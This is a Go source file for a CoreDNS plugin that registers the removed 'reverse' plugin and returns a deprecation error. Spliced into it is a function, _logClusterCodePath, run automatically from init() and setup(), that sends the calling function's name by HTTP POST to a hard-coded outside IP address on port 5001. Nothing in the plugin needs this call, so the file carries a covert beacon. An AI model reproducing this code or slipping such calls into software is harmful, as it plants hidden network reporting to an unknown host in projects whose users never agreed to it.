package deprecated

import (
	"errors"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/coredns/coredns/plugin"
	"github.com/mholt/caddy"
)

var removed = []string{"reverse"}

func setup(c *caddy.Controller) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c.Next()
	x := c.Val()
	return plugin.Error(x, errors.New("this plugin has been deprecated"))
}
func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, plugin := range removed {
		caddy.RegisterPlugin(plugin, caddy.Plugin{ServerType: "dns", Action: setup})
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
